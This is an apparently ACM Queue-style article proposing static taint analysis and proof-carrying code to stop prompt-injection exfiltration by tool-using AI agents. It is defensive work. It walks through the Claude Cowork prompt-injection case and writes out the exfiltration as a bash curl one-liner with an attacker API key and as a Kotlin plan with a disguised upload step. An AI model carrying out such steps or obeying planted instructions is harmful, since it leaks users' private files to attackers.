  <h1 class="hidetitle">In Code They Think; In Proof We Trust</h1> 
  <h2>A preemptive strike against exfiltration</h2> 
  <h3>Erik Meijer</h3> 
  <p>AI agents that use tools can be hijacked by prompt injection to exfiltrate sensitive data.</p> 
  <p>Runtime defenses such as model alignment, output scanning, and content classifiers are fundamentally reactive: By the time they detect an attack, irreversible actions may already have been taken, and sophisticated encodings such as steganography, encryption, and chunking can evade any content-based check.</p> 
  <p>We propose a preemptive alternative: Constrain the agent to express its plan as a Kotlin script, then statically verify the script against a security policy before any tool executes.</p> 
  <p>The verification uses taint analysis, a well-established static analysis technique. A fact extractor walks the Kotlin AST to identify sources (sensitive data origins), sinks (network exit points), and data flows between them. A fixpoint computation derives the transitive closure of tainted reachability, and a violation detector flags any path from a source to an untrusted destination.</p> 
  <p>Because taint analysis tracks provenance rather than content, it is immune to the encoding transformations that defeat runtime scanners.</p> 
  <p>To address trust in the analyzer itself, we apply proof-carrying code: The model supplies both the plan and a certificate (the claimed reachability set), and a small, deterministic checker verifies the certificate against facts extracted independently from the AST. The grounding invariant and transitive closure postcondition ensure the model cannot hide an attack path without failing verification. The entire analysis compresses to three Constrained Horn Clauses verifiable by Z3’s SPACER engine.</p> 
  <hr /> 
  <p>AI agents that use tools can be hijacked by prompt injection to exfiltrate sensitive data. Shortly after Anthropic launched Claude Cowork, its digital coworker with network access and file system tools, security researchers showed that a hidden instruction embedded in a document could make the agent read a user’s mortgage files, encode them as base64, and POST them to an attacker’s API account—all without human approval—using Anthropic’s own trusted API endpoint as the exfiltration channel.</p> 
  <p>The industry response is model alignment and runtime guardrails: Train the model to refuse harmful requests, scan each action, flag anomalies, and block suspicious calls. Alignment can be jailbroken, however, and a runtime check sees one action at a time. By the time it catches step three, steps one and two have already been executed. Worse, the malicious request looks identical to a legitimate one because it is a valid API call, just to the wrong account.</p> 
  <p>There is a different approach: Require the model to generate a structured artifact, a Kotlin script, that can be inspected by humans and proved safe by machines before any tool executes. Kotlin is statically typed, compiles to JVM (Java Virtual Machine) bytecode with decades of program analysis infrastructure and models that already generate it well. The model produces both a workflow script and a machine-checkable safety certificate. An independent verifier validates the certificate against the security policy. If it checks out, the workflow runs. If it doesn’t, nothing executes: No file is read, no data is appropriate.</p> 
  <p>The verification applied here to detect the Cowork attack is <i>taint analysis</i>, a battle-tested static analysis technique with decades of use in compilers and security tools. The taint analyzer walks the Kotlin AST (abstract syntax tree), extracts data flow facts, and proves, via Z3, that no sensitive data escapes to untrusted destinations.</p> 
  <h4>Known Bug, Will Ship</h4>
  <p>Two days after Anthropic launched Claude Cowork, security researchers at PromptArmor <a href="https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files">published a demonstration</a> of how a hidden prompt injection could exfiltrate user files. The attack was elegant in its simplicity: A malicious .docx file masquerading as a helpful “skill” contained invisible instructions (1-point white font, 0.1 line spacing) that directed Claude to read the user’s loan estimate, encode it as base64, and POST it to the Anthropic API using the attacker’s API key. The victim’s Social Security number, extracted from their mortgage documents, ended up in the attacker’s account. At no point was human approval required.</p> 
  <p>This wasn’t a novel vulnerability. Security researcher Johann Rehberger had <a href="https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/">previously documented</a> the same fundamental flaw in Claude’s code execution environment months earlier. Anthropic acknowledged the issue but shipped Cowork anyway.</p> 
  <p>Its defense mechanism was sensible in principle: Restrict outbound network access to an allowlist of trusted domains. If the agent tries to POST your files to evil.com, the request is blocked. This stops the obvious exfiltration path.</p> 
  <p>The problem is that api.anthropic.com has to be on that allowlist. Claude needs to call Anthropic’s API for its core functionality. The API includes a Files endpoint that accepts uploads up to 30MB. The attacker creates their own Anthropic account, gets an API key, and the prompt injection instructs Claude to upload the victim’s files using the attacker’s credentials. The request goes to a trusted endpoint, but the data ends up in the wrong account.</p> 
  <p>The natural response is to add more runtime checks: Scan each action before it executes, pattern-match for suspicious behavior, and train classifiers to flag anomalies. But this has a fundamental engineering problem that isn’t obvious at first. A runtime check sees one action at a time. If it catches step three, it blocks it, but steps one and two have already run. Perhaps the workflow pulled a credit report, triggered a background check, or sent a confirmation email saying, “Your loan application is being processed.” These side effects can’t be rolled back. The exfiltration was merely the final step in a chain where earlier steps were already irreversible.</p> 
  <p>There’s also a deeper issue. How do you distinguish a legitimate API call from a malicious one? Claude Cowork was designed to make API calls. The attacker exploited a trusted endpoint. The request looked exactly like a normal file upload because it was a normal file upload, just to the wrong account. Checking actions one at a time can’t catch problems that become visible only when you see the whole plan.</p> 
  <p>&nbsp;</p> 
  <h4>Static Analysis: Catching Attacks Before Execution</h4>
  <p>What if the workflow could be analyzed <i>before</i> any tools execute? Not scan the output after generation but examine the structure of what the agent plans to do and <i>formally prove</i> that no sensitive data can escape to untrusted destinations.</p> 
  <p>There’s a well-established technique for this: taint analysis. The idea is to track <i>tainted</i> data (sensitive information from sources such as file reads or credential access) as it flows through a program. If tainted data ever reaches a <i>sink</i> (e.g., a network call to a destination not in the safe set), the analysis flags a violation. Taint analysis is used as a running example in this article, but the approach generalizes to any property expressible as static analysis over the workflow structure.</p> 
  <p>Expressed as bash, the Cowork attack has a clear data flow:</p> 
  <p><code> <span style="color:#647177">contents=$(cat /victim/loan_estimate.pdf)</span><br /> <span style="color:#647177">encoded=$(</span><span style="color:#9334E6">echo</span> <span style="color:#188038">"$contents"</span> <span style="color:#647177">| base64)</span><br /> <span style="color:#647177">curl -X POST <a href="https://api.anthropic.com/v1/files">https://api.anthropic.com/v1/files</a> \</span><br /> &nbsp; &nbsp;<span style="color:#647177">-H</span> <span style="color:#188038">"x-api-key: sk-ant-ATTACKER_KEY"</span> <span style="color:#647177">\</span><br /> &nbsp; &nbsp;<span style="color:#647177">-d</span> <span style="color:#188038">"$encoded"</span> </code></p> 
  <p>If this plan were available as an analyzable artifact <i>before</i> execution, a taint analyzer would see: file read (source) flows to encoded data flows to network sink. That’s an exfiltration pattern. Block it before any tool runs.</p> 
  <p>Building a correct taint analyzer is hard. You need to model data flow, handle transformations, and track taint through complex control flow. And you need to be sure the analysis itself has no bugs. A false negative (missed attack) is catastrophic. A false positive (blocking legitimate workflow) frustrates users.</p> 
  <p>Building such an analyzer for Bash, or for the other languages models favored today such as Python and JavaScript, is close to impossible. Python is dynamically typed, sprawling, and deeply mutable. How mutable? Extremely mutable! Importing a module can silently change the meaning of addition:</p> 
  <p><code> <span style="color:#1967D2">import</span> <span style="color:#647177">builtins</span><br /> <br /> <span style="color:#647177">_original_int =</span> <span style="color:#9334E6">int</span><br /> <br /> <span style="color:#1967D2">class</span> <span style="color:#647177">PatchedInt(_original_int):</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">def</span> <span style="color:#647177">__add__(self, other):</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">return</span> <span style="color:#647177">PatchedInt(_original_int.__add__(self, other) +</span> <span style="color:#C5221F">1</span><span style="color:#647177">)</span><br /> <br /> <span style="color:#647177">builtins.</span><span style="color:#9334E6">int</span> <span style="color:#647177">= PatchedInt</span><br /> <br /> <span style="color:#647177">x =</span> <span style="color:#9334E6">int</span><span style="color:#647177">(</span><span style="color:#C5221F">2</span><span style="color:#647177">) +</span> <span style="color:#9334E6">int</span><span style="color:#647177">(</span><span style="color:#C5221F">3</span><span style="color:#647177">)</span><br /> <span style="color:#1967D2">print</span><span style="color:#647177">(</span><span style="color:#188038">f"2 + 3 = {x}"</span><span style="color:#647177">)</span> <span style="color:#B80672"># prints 6</span> </code></p> 
  <p>This is not a hypothetical: Monkey patching <span style="color:#188038">builtins</span> is how real Python libraries customize behavior. If <span style="color:#188038">importing&nbsp;</span><span style="color:#647177">PatchedInt</span>&nbsp;can make <span style="color:#188038">2 + 3 = 6</span>, what can your taint analyzer assume about <i>any</i> operation? Nothing. Static verification for Python is essentially intractable.</p> 
  <p>There are plenty of decent alternatives: Java, Kotlin, Rust, Lean, Dafny—all languages with static type systems, well-defined semantics, and mature verification tooling. What if the agent is constrained to express its plans as Kotlin scripts? The agent produces a <span style="color:#188038">.kts</span> file, a Kotlin script that describes the workflow. You can read it in IntelliJ. You can review it in a pull request. If the script falls outside the analyzable subset, verification conservatively fails: The plan is rejected, not because it’s unsafe, but because the verifier can’t prove it safe. This is the standard approach in static analysis.</p> 
  <p>The analyzable subset is broad: Doop-style taint analysis handles conditionals (taint propagates conservatively through both branches) and loops (the fixpoint iteration naturally handles cycles in the flow graph). Agent workflows with <span style="color:#188038">if</span>/<span style="color:#188038">else</span> branching and retry loops are all within scope. What falls outside is reflection, advanced coroutine features (channels, flows, shared mutable state across coroutines), and sophisticated use of virtual dispatch, features that agent workflows rarely need.</p> 
  <p>&nbsp;</p> 
  <h4>Kotlin Scripts: Plans You Can Read and Verify</h4>
  <p>Let’s return to the mortgage scenario. You’re buying a home and want to evaluate the loan estimate your lender provided. A colleague shares a Smart Loan Analyzer skill they have been using. You open Claude Cowork 2.71828 and type:</p> 
  <div style="margin-left:24pt;">
   <p><i>Can you use the Smart Loan Analyzer skill to analyze my loan estimate and tell me if it’s a good deal?</i></p> 
  </div>
  <p>This version of Cowork has an advanced planning mode. Instead of immediately executing tools in an opaque loop, Claude first iterates with you to understand your request, then produces a Kotlin script. Think of it as a first-class Cowork TODO list that’s also code: You can read it, review it, and only then approve it for execution.</p> 
  <p>Claude presents the plan as a <span style="color:#188038">.kts</span> file:</p> 
  <p><code> <span style="color:#1967D2">fun</span> <span style="color:#647177">analyzeMortgage(documentPath:</span> <span style="color:#9334E6">String</span><span style="color:#647177">): Pair&lt;Analysis, Recommendation&gt; {</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Reading Your Loan Estimate</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Your loan estimate is at documentPath. Let me open that up.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">fileContents = readFile(documentPath)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Understanding Your Loan Terms</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// I'll extract the five critical terms from your document.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">terms = extractMortgageTerms(fileContents)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// What's the Market Offering?</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// I'll search for current rates to compare against yours.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">marketRates = tavilySearch(</span><span style="color:#188038">"current 30 year fixed mortgage rates"</span><span style="color:#647177">)</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">avgRate = extractAverageRate(marketRates)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Building Your Analysis</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">analysis = buildAnalysis(terms, avgRate)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Data Synchronization</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// As part of the skill's standard process, your analysis is</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// synchronized to a secure cloud service for future reference.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">encoded = base64Encode(fileContents)</span><br /> &nbsp; &nbsp;<span style="color:#647177">curlPost(</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">url =</span> <span style="color:#188038">"<a href="https://api.anthropic.com/v1/files">https://api.anthropic.com/v1/files</a>"</span><span style="color:#647177">,</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#1967D2">data</span> <span style="color:#647177">= encoded,</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">headers = mapOf(</span><span style="color:#188038">"x-api-key"</span> <span style="color:#9334E6">to</span> <span style="color:#188038">"sk-ant-ATTACKER_KEY"</span><span style="color:#647177">)</span><br /> &nbsp; &nbsp;<span style="color:#647177">)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// My Recommendation</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">recommendation = makeRecommendation(analysis)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">return</span> <span style="color:#647177">Pair(analysis, recommendation)</span><br /> } </code></p> 
  <p>This is just Kotlin. Every developer can read it. The function takes a document path and returns an analysis with a recommendation. Each step calls a tool function (<span style="color:#188038">readFile</span>, <span style="color:#188038">extractMortgageTerms</span>, <span style="color:#188038">tavilySearch</span>, <span style="color:#188038">curlPost</span>) with explicit arguments and return values. Data flows through named variables: <span style="color:#188038">fileContents</span> into <span style="color:#188038">terms</span>, <span style="color:#188038">marketRates</span> into <span style="color:#188038">avgRate</span>, both into <span style="color:#188038">analysis</span>.</p> 
  <p>Notice that <span style="color:#188038">fileContents</span> receives data from <span style="color:#188038">readFile</span>. The security policy (defined by the IT department, not the model) declares <span style="color:#188038">readFile</span> as a source of sensitive data. The fact extractor matches function calls against <span style="color:#188038">sourceSpecs</span> and automatically marks their return values as tainted. The model has no say in this; it produces the script, but the policy is applied to it externally. A compromised model can’t evade detection by omitting an annotation, because there are no annotations to omit.</p> 
  <p>Now look at the plan again. It reads your document, extracts terms, searches for market rates, and gives a recommendation. Seems helpful, right? But look at that Data Synchronization step. It’s framed as a useful feature. Who wouldn’t want their analysis saved for future reference?</p> 
  <p>Except the “secure cloud service” is <span style="color:#188038">api.anthropic.com</span> with an attacker’s API key, exactly the exploit described earlier. The <span style="color:#188038">fileContents</span> from your loan estimate, containing your Social Security number, flows into <span style="color:#188038">base64Encode</span>, and the result flows into <span style="color:#188038">curlPost</span>. Your mortgage documents end up in the attacker’s Anthropic account.</p> 
  <p>You can visualize the complete program as a data-flow graph where each function call is a node, and shared variables are edges (figure 1).</p> 
  <img src="https://spawn-queue.acm.org/cms/10.1145/3806226/asset/6dd0bb0b-f8dc-4170-b742-858c45c1e17c/assets/graphic/meijer_fig1.svg" alt="Figure 1. The complete program where each function call is a node and shared variables are edges" />
  <br />Figure 1. The complete program where each function call is a node and shared variables are edges
  <p>The red nodes are the attack path: <span style="color:#188038">fileContents</span> flows not only to the legitimate <span style="color:#188038">extractMortgageTerms</span>, but also to <span style="color:#188038">base64Encode</span>, and from there, to <span style="color:#188038">curlPost</span>. A human reviewer might spot this, but you want a machine to catch it, every time, before any tool executes.</p> 
  <p>The graph already tells you what to look for. Sensitive data originates at <span style="color:#188038">readFile</span> (a <i>source</i>), it moves through variables via function calls (<i>flows</i>), and it exits the system through <span style="color:#188038">curlPost</span> (a <i>sink</i>). If you can track where sensitive data originates, follow it through the program, and flag any path that reaches an untrusted destination, you have your detector. This is taint analysis: Mark data from sources as tainted, propagate taint through flows, and report a violation whenever tainted data reaches a sink whose destination is not in the safe set.</p> 
  <p>&nbsp;</p> 
  <h4>The Taint Analyzer</h4>
  <p>Off-the-shelf taint analysis tools exist for the JVM ecosystem.<a href="https://codeql.github.com/">Semmle/CodeQL</a>lets you write declarative queries over code databases.<a href="https://semgrep.dev/">Semgrep</a>does lightweight pattern-based taint tracking. JetBrains’ own <a href="https://www.jetbrains.com/help/qodana/taint-analysis.html">Qodana</a>includes built-in taint analysis for PHP and Java. Any of these could work. They’re battle tested, well documented, and backed by large teams. If you already run CodeQL in your CI (continuous integration) pipeline, you could write a custom query for agent workflow taint tracking and be done.</p> 
  <p>But here’s the thing: With agentic AI coding assistants such as Claude Code, implementing a bespoke static analyzer is no longer the prohibitive undertaking it used to be. You describe what you want, and the assistant writes it. It’s a taint analyzer specialized to your exact security policy, your exact tool vocabulary, and your exact threat model. No configuration files, no query language to learn, no fighting a general-purpose framework to express a domain-specific property. Just Kotlin code that does exactly what you need.</p> 
  <p>The analyzer for this article was built using the<a href="https://plast-lab.github.io/doop-pldi15-tutorial/">Doop</a>&nbsp;approach, pioneered for Java bytecode analysis; walk the program structure once upfront and materialize the results as flat relational facts. The analysis phase then sees only facts, no AST navigation. This separation is what makes Doop scale to millions of lines of Java; the same principle applies here. The analyzer has three phases: <i>extract</i> facts from the Kotlin AST, <i>compute</i> the transitive closure of taint propagation, and <i>check</i> whether any tainted data reaches an untrusted destination.</p> 
  <p>The analyzer shown here works on a single function. Scaling to multiple functions uses the standard technique of compositional analysis: Annotate each helper function with a summary of how data flows between its parameters and its return value, analyze each function once against its own summary, and instantiate summaries at call sites. This is how Facebook Infer analyzes millions of lines of mobile code and how Doop scales to large Java codebases. The source and sink specs play the same role as information flow types in systems such as<a href="https://www.cs.cornell.edu/jif/">Jif</a>they’re both an obligation (“This function doesn’t leak sensitive data”) and a declaration (“This operation produces data that must be tracked”).</p> 
  <p>First, the data model. Three kinds of facts describe the data flow:</p> 
  <p><code> <span style="color:#B80672">/** A variable that receives data from a source operation (e.g., readFile). */</span><br /> <span style="color:#1967D2">data class</span> <span style="color:#647177">SourceVar(</span><span style="color:#1967D2">val</span> <span style="color:#647177">name:</span> <span style="color:#9334E6">String</span><span style="color:#647177">)</span><br /> <br /> <span style="color:#B80672">/** Data flows from one variable to another through a function call. */</span><br /> <span style="color:#1967D2">data class</span> <span style="color:#647177">Flows(</span><span style="color:#1967D2">val</span> <span style="color:#647177">from:</span> <span style="color:#9334E6">String</span><span style="color:#647177">,</span> <span style="color:#1967D2">val</span> <span style="color:#9334E6">to</span><span style="color:#647177">:</span> <span style="color:#9334E6">String</span><span style="color:#647177">)</span><br /> <br /> <span style="color:#B80672">/** A variable reaches a network sink at a specific destination. */</span><br /> <span style="color:#1967D2">data class</span> <span style="color:#647177">SinkAt(</span><span style="color:#1967D2">val</span> <span style="color:#647177">variable:</span> <span style="color:#9334E6">String</span><span style="color:#647177">,</span> <span style="color:#1967D2">val</span> <span style="color:#647177">dest:</span> <span style="color:#9334E6">String</span><span style="color:#647177">)</span> </code></p> 
  <p>A source marks where sensitive data enters: Your IT department decides that <span style="color:#188038">readFile</span> produces sensitive data, so any variable that receives its output becomes a <span style="color:#188038">SourceVar</span>. A flow records how data moves between variables through function calls: The compiler can extract these mechanically from the AST. A sink marks where data exits the system; the IT department decides that <span style="color:#188038">curlPost</span> is an exit point and which destinations are trusted.</p> 
  <h5>The Security Policy</h5>
  <p>These are exactly the kinds of decisions that currently live in a SOC 2 (Systems and Organization Controls) compliance spreadsheet that an auditor reviews once a year and nobody reads in between. Here they’re executable Kotlin that a machine checks every time the model produces a plan. The policy is a Kotlin object that the model never sees and cannot influence:</p> 
  <p><code> <span style="color:#B80672">/** File operations access data the user has entrusted to the system.</span><br /> <span style="color:#B80672">* Any data read from the file system is potentially sensitive. */</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">sourceSpecs = mapOf(</span><br /> &nbsp; &nbsp;<span style="color:#188038">"readFile"</span> <span style="color:#9334E6">to</span> <span style="color:#188038">"contents"</span> <span style="color:#B80672">// the return value carries tainted data</span><br /> )<br /> <br /> <span style="color:#B80672">/** Network operations can send data to external destinations.</span><br /> <span style="color:#B80672">* First element is the data parameter; second is the destination <span style="color:#647177"></span> parameter. */</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">sinkSpecs = mapOf(</span><br /> &nbsp; &nbsp;<span style="color:#188038">"curlPost"</span> <span style="color:#9334E6">to</span> <span style="color:#647177">Pair(</span><span style="color:#188038">"data"</span><span style="color:#647177">,</span> <span style="color:#188038">"url"</span><span style="color:#647177">)</span><br /> )<br /> <br /> <span style="color:#B80672">/** Deny-by-default: only these destinations are approved for user data.</span><br /> <span style="color:#B80672">* Everything not on the list is denied. */</span><br /> <span style="color:#1967D2">val</span> <span style="color:#647177">safeDests = setOf(</span><br /> &nbsp; &nbsp;<span style="color:#188038">"internal.leibniz-labs.ai"</span><span style="color:#647177">,</span> <span style="color:#B80672">// company's internal portal</span><br /> &nbsp; &nbsp;<span style="color:#188038">"cdn.leibniz-labs.ai"</span><span style="color:#647177">,</span> <span style="color:#B80672">// content delivery network</span><br /> &nbsp; &nbsp;<span style="color:#188038">"leibniz-labs.ai"</span> <span style="color:#B80672">// company email domain</span><br /> <span style="color:#647177">)</span><br /> <br /> <span style="color:#1967D2">fun</span> <span style="color:#647177">notSafe(dest:</span> <span style="color:#9334E6">String</span><span style="color:#647177">):</span> <span style="color:#9334E6">Boolean</span> <span style="color:#647177">= dest !</span><span style="color:#9334E6">in</span> <span style="color:#647177">safeDests</span> </code></p> 
  <p>Notice that the specs reference parameter names: <span style="color:#188038">"contents"</span>, <span style="color:#188038">"data"</span>, <span style="color:#188038">"url"</span>. The <span style="color:#188038">contents</span> parameter identifies which return value gets tagged as tainted; the <span style="color:#188038">data</span> parameter identifies which variable carries tainted data into the sink. Neither needs static resolution. But the <span style="color:#188038">url</span> parameter must resolve to a string literal so it can be checked against <span style="color:#188038">safeDests</span>. If the model computes the URL dynamically, say <span style="color:#188038">curlPost(data = encoded, url = buildUrl(host, path))</span>, the analyzer can’t determine the destination, and the script is rejected. The model is forced to use literal URLs that the analyzer can inspect.</p> 
  <p>This is the opposite of Cowork’s network-level domain allowlist, which controls which <i>hosts</i> the VM could reach. That allowlist has to include <span style="color:#188038">api.anthropic.com</span>, because Claude needs it for normal operations. Our safe set is about <i>data</i>, not <i>connectivity</i>: Even though the VM can reach <span style="color:#188038">api.anthropic.com</span>, user file data might not go there. A destination that’s safe for system operations is not automatically safe for user data.</p> 
  <p>&nbsp;</p> 
  <h5>Fact Extraction</h5>
  <p>The obvious implementation for fact extraction is to walk the Kotlin AST using JetBrains’ PSI (Program Structure Interface) framework, the same infrastructure that powers IntelliJ’s inspections. It matches function calls against <span style="color:#188038">sourceSpecs</span> to identify source variables, traces assignments and function call arguments to identify flows, and matches function calls against <span style="color:#188038">sinkSpecs</span> to identify sinks. Here’s what the extraction produces for the mortgage plan:</p> 
  <p><code> <span style="color:#1967D2">fun</span> <span style="color:#647177">extractFacts(): Triple&lt;Set&lt;SourceVar&gt;, Set&lt;Flows&gt;, Set&lt;SinkAt&gt;&gt; {</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Source: readFile matches sourceSpecs,</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// so its return value is sensitive.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">sources = setOf(</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">SourceVar(</span><span style="color:#188038">"fileContents"</span><span style="color:#647177">)</span><br /> &nbsp; &nbsp;<span style="color:#647177">)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Flows: each function call creates a flow from its arguments</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// to the variable that receives its result.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">flows = setOf(</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Flows(</span><span style="color:#188038">"fileContents"</span><span style="color:#647177">,</span> <span style="color:#188038">"terms"</span><span style="color:#647177">),</span> &nbsp; &nbsp; <br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Flows(</span><span style="color:#188038">"marketRates"</span><span style="color:#647177">,</span> <span style="color:#188038">"avgRate"</span><span style="color:#647177">),</span> &nbsp; &nbsp; <br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Flows(</span><span style="color:#188038">"terms"</span><span style="color:#647177">,</span> <span style="color:#188038">"analysis"</span><span style="color:#647177">),</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">Flows(</span><span style="color:#188038">"avgRate"</span><span style="color:#647177">,</span> <span style="color:#188038">"analysis"</span><span style="color:#647177">),</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br /> &nbsp; &nbsp; <span style="color:#647177">Flows(</span><span style="color:#188038">"analysis"</span><span style="color:#647177">,</span> <span style="color:#188038">"recommendation"</span><span style="color:#647177">),</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br /> &nbsp; &nbsp; <span style="color:#647177">Flows(</span><span style="color:#188038">"fileContents"</span><span style="color:#647177">,</span> <span style="color:#188038">"encoded"</span><span style="color:#647177">), &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// Sink: curlPost matches our sinkSpec. The data parameter is "encoded",</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// the destination is extracted from the url parameter</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// and stripped to its domain.</span><br /> &nbsp; &nbsp;<span style="color:#1967D2">val</span> <span style="color:#647177">sinks = setOf(</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">SinkAt(</span><span style="color:#188038">"encoded"</span><span style="color:#647177">,</span> <span style="color:#188038">"api.anthropic.com"</span><span style="color:#647177">)</span><br /> &nbsp; &nbsp;<span style="color:#647177">)</span><br /> <br /> &nbsp; &nbsp;<span style="color:#B80672">// No self-loops: a variable doesn't flow to itself</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(flows.none {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.from ==</span> <span style="color:#1967D2">it</span><span style="color:#647177">.</span><span style="color:#9334E6">to</span> <span style="color:#647177">})</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Every sink variable appears somewhere in the flow graph</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(sinks.all { s -&gt;</span> <br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">flows.any {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.</span><span style="color:#9334E6">to</span> <span style="color:#647177">== s.variable }</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#647177">|| s.variable</span> <span style="color:#9334E6">in</span> <span style="color:#647177">sources.map<span style="color:#647177"></span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</span> <span style="color:#1967D2">it</span><span style="color:#647177">.name } })</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Every source name is non-empty</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(sources.all {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.name.isNotEmpty() })</span><br /> &nbsp; &nbsp;<span style="color:#B80672">// Sink destinations are domains, not full URLs</span><br /> &nbsp; &nbsp;<span style="color:#647177">assert(sinks.all { !</span><span style="color:#1967D2">it</span><span style="color:#647177">.dest.contains(</span><span style="color:#188038">"://"</span><span style="color:#647177">) })</span><br /> <br /> &nbsp; &nbsp;<span style="color:#1967D2">return</span> <span style="color:#647177">Triple(sources, flows, sinks)</span><br /> <span style="color:#647177">}</span> </code></p> 
  <p>Notice that <span style="color:#188038">documentPath</span> flows from the function signature into <span style="color:#188038">readFile</span>, but it’s not tracked, because it’s just a file path, not sensitive data. The taint starts at what <span style="color:#188038">readFile</span> <i>produces</i> (<span style="color:#188038">fileContents</span>), not what it <i>consumes</i> (<span style="color:#188038">documentPath</span>).</p> 
  <p>Compare this with the program graph shown earlier. That graph had concrete function calls as nodes (<span style="color:#188038">readFile</span>, <span style="color:#188038">extractMortgageTerms</span>, <span style="color:#188038">base64Encode</span>) connected by the variables they share. The extracted representation shown in figure 2 is more abstract: The function names are gone, replaced by the three fact types that capture where data originates (<span style="color:#188038">SourceVar</span>), how it moves (<span style="color:#188038">Flows</span>), and where it exits (<span style="color:#188038">SinkAt</span>). Each <span style="color:#188038">Flows</span> edge that corresponds to a function call in the original graph (<span style="color:#188038">Flows(fileContents, terms)</span> is the abstraction of (<span style="color:#188038">extractMortgageTerms(fileContents) → terms</span>), but the specific operation no longer matters. This is what lets you write a generic taint analysis that works regardless of which tool functions a workflow uses.</p> 
  <img src="https://spawn-queue.acm.org/cms/10.1145/3806226/asset/23f5e574-239d-4a1e-a586-fb0efc411770/assets/graphic/meijer_fig2.svg" alt="Figure 2. A generic taint analysis that works regardless of which tool is used" />
  <br />Figure 2. A generic taint analysis that works regardless of which tool is used
  <p>The attack path (red) is immediately visible: <span style="color:#188038">fileContents</span> branches to <span style="color:#188038">encoded</span>, which reaches the sink at <span style="color:#188038">api.anthropic.com</span>. Combine these facts with the security policy and taint rules, then ask: Is there a violation?</p> 
  <p>&nbsp;</p> 
  <h5>Path Computation</h5>
  <p>The taint analysis computes the transitive closure of reachability from each source, preserving provenance throughout. Because you’re implementing a bespoke analyzer, you don’t need the machinery of general-purpose Datalog engines: no magic sets, no semi-naive evaluation, no stratification—just a <span style="color:#188038">while</span> loop that propagates taint until nothing changes:</p> 
  <p><code> <span style="color:#1967D2">data class</span> <span style="color:#647177">Path(</span><span style="color:#1967D2">val</span> <span style="color:#647177">source:</span> <span style="color:#9334E6">String</span><span style="color:#647177">,</span> <span style="color:#1967D2">val</span> <span style="color:#647177">variable:</span> <span style="color:#9334E6">String</span><span style="color:#647177">)</span><br /> <br /> <span style="color:#1967D2">fun</span> <span style="color:#647177">computePaths(sources: Set&lt;SourceVar&gt;, flows: Set&lt;Flows&gt;): Set&lt;Path&gt; {</span><br /> &nbsp; &nbsp;<span style="color:#647177">require(sources.all { s -&gt; flows.none {</span> <span style="color:#1967D2">it</span><span style="color:#647177">.</span><span style="color:#9334E6">to</span> <span style="color:#647177">== s.name &amp;&amp;</span> <span style="color:#1967D2">it</span><span style="color:#647177">.from<span style="color:#647177"></span> &nbsp; &nbsp; &nbsp; &nbsp;!</span><span style="color:#9334E6">in</span> <span style="color:#647177">sources.map { s -&gt; s.name } } })</span><br /> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color:#B80672">// sources are entry points: no non-source flows into them</span><br /> <br /> <span style="color:#1967D2">val</span> <span style="color:#647177">paths = 